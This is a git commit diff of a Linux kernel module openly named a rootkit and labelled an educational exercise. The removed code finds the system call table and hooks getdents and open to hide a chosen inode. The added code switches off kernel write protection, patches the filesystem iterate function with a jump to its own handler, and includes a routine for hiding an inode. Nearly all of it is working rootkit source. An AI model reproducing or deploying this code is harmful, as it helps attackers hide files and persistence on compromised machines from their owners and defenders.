bd3ae7bf6a87ec28d31c4df88a0ddd1690f5e7b6
firejox <firejox@gmail.com>
2016-01-14 03:43:12 +0800

    rewrite rootkit

--- rootkit.c
+++ rootkit.c
@@ -2,188 +2,207 @@
  * rootkit
  * */
 
-
-#include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/unistd.h>
-#include <linux/dcache.h>
-#include <linux/namei.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/kobject.h>
+#include <linux/string.h>
+#include <linux/slab.h>
+#include <linux/version.h>
 #include <linux/fs.h>
-#include <linux/path.h>
-
-#include <asm/syscall.h>
-
-#include <asm/pgtable.h>
 
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("firejox");
-MODULE_DESCRIPTION("hook open and getdents");
+#if defined(__i386__)
+#define code_size 6
+#define jack_code "\x68\x00\x00\x00\x00\xc3"
+#define load_fp_size 1
+#define call_fp_size 1
 
-struct linux_dirent {
-    unsigned long  d_ino;
-    unsigned long  d_off;
-    unsigned short d_reclen;
-    char           d_name[];
+#else
+#define code_size 12
+#define jack_code "\x48\x8b\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
+#define load_fp_size 2
+#define call_fp_size 2
 
+#endif
+
+
+static struct file_operations origin;
+
+typedef struct {
+    unsigned char load_fp[load_fp_size]; //load code
+    void *fp __attribute__((packed)); // hook function pointer
+    unsigned char call_fp[call_fp_size]; //call fp
+} hijack_pack_t;
+
+struct hook_node {
+    void *hooked_fp;
+
+    hijack_pack_t hijack_code;
+
+    unsigned char o_code[code_size]; //origin code
+    struct list_head list;
 };
 
-typedef void (*handle_t) (void);
-
-handle_t *syscall_table = NULL;
-
-static unsigned long hide_inode = 3675405;
-
-typedef asmlinkage int (*handle_getdents) (
-        unsigned int fd,
-        struct linux_dirent __user *dirp,
-        unsigned int count);
-
-static handle_getdents real_getdents = NULL;
-
-typedef asmlinkage int (*handle_open) (
-        const char __user *pathname,
-        int flags);
-
-static handle_open real_open = NULL;
+static LIST_HEAD(hook_pool);
 
 
-static unsigned int level;
-static pte_t *pte;
-
-
-asmlinkage int hook_getdents(
-        unsigned int fd,
-        struct linux_dirent __user *dirp,
-        unsigned int count) {
-
-    int ret = real_getdents(fd, dirp, count);
-    struct linux_dirent *cur = NULL, *prev = NULL;
-    char *p = (char*)(void*)dirp;
-    int bpos = 0;
-
-    printk ("Hook succeed!\n");
-
-#if 0
-    if (ret > 0) {
-        while (bpos < ret) {
-            prev = cur;
-            cur = (struct linux_dirent*)(p + bpos);
-            bpos += cur->d_reclen;
-
-            if (prev != NULL && cur->d_ino == hide_inode) {
-                prev->d_reclen += cur->d_reclen;
-                cur = prev;
-            }       
-        }
+static inline struct hook_node *find_hook_node (void *fp) {
+    struct hook_node *nd;
+    
+    list_for_each_entry (nd, &hook_pool, list) {
+        if (nd->hooked_fp == fp)
+            return nd;
     }
-#endif
+
+    return NULL;
+}
+
+
+static inline unsigned long disable_wp(void) {
+    unsigned long cr0;
+    
+    preempt_disable();
+    barrier();
+    cr0 = read_cr0();
+    write_cr0(cr0 & ~X86_CR0_WP);
+
+    return cr0;
+}
+
+static inline void restore_wp(unsigned long cr0) {
+    write_cr0(cr0);
+    barrier();
+    preempt_enable();
+}
+
+static void hijack_fp(struct hook_node *nd) {
+    unsigned long o_cr0 = disable_wp();
+
+    memcpy (nd->hooked_fp, &nd->hijack_code, code_size);
+
+    restore_wp (o_cr0);
+}
+
+static void resume_fp(struct hook_node *nd) {
+    unsigned long o_cr0 = disable_wp();
+    
+    memcpy (nd->hooked_fp, &nd->o_code, code_size);
+
+    restore_wp (o_cr0);
+}
+
+static struct dir_context *o_ctx;
+static u64 hide_inode = 51329ULL;
+
+static int root_filldir (struct dir_context *ctx,
+        const char *name, int len, loff_t offset, u64 ino, unsigned d_type) {
+    int ret = o_ctx->actor(o_ctx, name, len, offset, ino, d_type);
+    
+    if (ino == hide_inode)
+        return 0;
+
     return ret;
 }
 
-asmlinkage int hook_open (
-        const char __user *pathname,
-        int flags) {
-    struct inode *node;
-    struct dentry *entry = NULL;
-    struct path p;
+//static struct dir_context root_ctx = {
+//    .actor = root_filldir
+//};
 
-    kern_path (pathname, LOOKUP_FOLLOW, &p);
-    entry = p.dentry;
-    
-    while (entry != NULL) {
-        if (entry->d_inode->i_ino == hide_inode)
-            return -1;
-        entry = entry->d_parent;
-    }
+int rootkit_iterate (struct file *file, struct dir_context *ctx) {
+    int ret;
+    struct hook_node *nd = find_hook_node(origin.iterate);
+//    root_ctx.pos = ctx->pos;
+//    o_ctx = ctx;
 
-    return real_open (pathname, flags);
+    printk ("hook iterate succeed!\n");
+    resume_fp (nd);
+    ret = origin.iterate(file, ctx);
+    hijack_fp (nd);
+
+    return ret;
 }
 
-
-static int rootkit_init(void) {
-    struct desc_ptr idt;
-    gate_desc *sys_gate;
-    unsigned char *syscall_ptr;
+static void register_hook (void *dest, void *new) {
+    struct hook_node *nd;
+    unsigned char tmp[code_size];
     int i;
+
+    nd = kmalloc (sizeof (struct hook_node), GFP_KERNEL);
+
+    memcpy (&nd->hijack_code, jack_code, code_size);
+    memcpy (nd->o_code, dest, code_size);
     
-    printk("load rootkit module");
+    nd->hooked_fp = dest;
+    nd->hijack_code.fp = new;
 
-    asm ("sidt %0" : "=m" (idt));
+    list_add (&nd->list, &hook_pool);
 
-    printk ("IDT address : %#lx\n" , idt.address);
+    printk ("register hook fp : %p %p\n", dest, new);
 
-    sys_gate =  ((gate_desc*)(idt.address + 0x80*16));
+    printk ("register hook fp : %p\n", find_hook_node(dest));
 
+    memcpy (tmp, &nd->hijack_code, code_size);
 
-    syscall_ptr = (unsigned char*)(gate_offset(*sys_gate));
+    for (i = 0; i < code_size; i++)
+        printk("hijack code[%d] : %#1x\n", i, tmp[i]);
 
-    printk ("syscall address : %#lx\n", syscall_ptr);
+    hijack_fp(nd);
+    //resume_fp(nd);
+}
 
-    //printk ("table address: %#x\n", sys_call_table);
+static void get_file_op(const char *path) {
+    struct file *f;
 
-    for (i = 0; i < 128; i+=8) { 
-        printk("%02x %02x %02x %02x %02x %02x %02x %02x\n", 
-                syscall_ptr[i], syscall_ptr[i+1], syscall_ptr[i+2], 
-                syscall_ptr[i+3], syscall_ptr[i+4], syscall_ptr[i+5], 
-                syscall_ptr[i+6], syscall_ptr[i+7]);
-    }
+    if ((f = filp_open (path, O_RDONLY, 0)) == NULL) 
+        return;
+
+    memcpy (&origin, f->f_op, sizeof (struct file_operations));
+
+    printk ("iterate fp : %p\n", origin.iterate);
     
+    filp_close (f, 0);
 
-    for (i = 0; i < 128; i++) {
-        if (syscall_ptr[i] == 0xff && 
-                syscall_ptr[i+1] == 0x14 &&
-                syscall_ptr[i+2] == 0xc5) {
-            unsigned long tmp = *(unsigned long*)(syscall_ptr + i + 3);
-            tmp = (tmp & 0x00000000ffffffff) | 0xffffffff00000000;
-
-            syscall_table = *(handle_t**)tmp;
-            break;
-        }
-    }
-
-    if (syscall_table == NULL) {
-        printk ("fail to find system call table!!\n");
-        return 0;
-    }
-
-    printk ("syscall table address : %#lx\n", syscall_table);
-    real_getdents = syscall_table[__NR_getdents];
-    real_open = syscall_table[__NR_open];
-
-    printk ("open address : %#lx\n", real_open);
-    printk ("getdents address: %#lx\n", real_getdents);
-
-    pte = lookup_address ((unsigned long) syscall_table, &level);
-
-    printk ("pte level : %d\n", level);
-
-    set_pte_atomic (pte, pte_mkwrite(*pte));
-#if 1
-    
-    syscall_table[__NR_getdents] = (handle_t)hook_getdents;
-
-#endif
-    set_pte_atomic (pte, pte_wrprotect(*pte));
-
-    printk ("getdents hook!!\n");
-    return 0;    
+    printk ("iterate fp : %p\n", origin.iterate);
 }
 
 
-static void rootkit_exit (void) {
 
-    set_pte_atomic (pte, pte_mkwrite(*pte));
+int rootkit_init(void) {
+    printk ("rootkit module load!\n");
+    
+    // check packed succeed
+    printk ("load offset :%lu %lu %lu\n",
+            offsetof(hijack_pack_t, load_fp),
+            offsetof(hijack_pack_t, fp),
+            offsetof(hijack_pack_t, call_fp));
 
-    if (real_getdents) 
-        syscall_table[__NR_getdents] = (handle_t) real_getdents;
+    get_file_op("/tmp");
 
-    set_pte_atomic (pte, pte_wrprotect(*pte));
+    register_hook (origin.iterate, rootkit_iterate);
 
-    printk ("Unload rootkit module!!\n");
+    return 0;
 }
 
+void rootkit_exit(void) {
+    struct hook_node *nd, *tmp;
+
+
+    printk ("cleanup hook pool:\n");
+    list_for_each_entry_safe (nd, tmp, &hook_pool, list) {
+        printk ("unregister fp : %p\n", nd->hooked_fp);
+        resume_fp (nd);
+
+        list_del (&nd->list);
+        kfree (nd);
+    }
+    
+    printk ("rootkit module unload!\n");
+}
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
 
+MODULE_LICENSE("Dual MIT/GPL");
+MODULE_AUTHOR("firejox");
+MODULE_DESCRIPTION("Rootkit pratice. For educational purpose.\n");
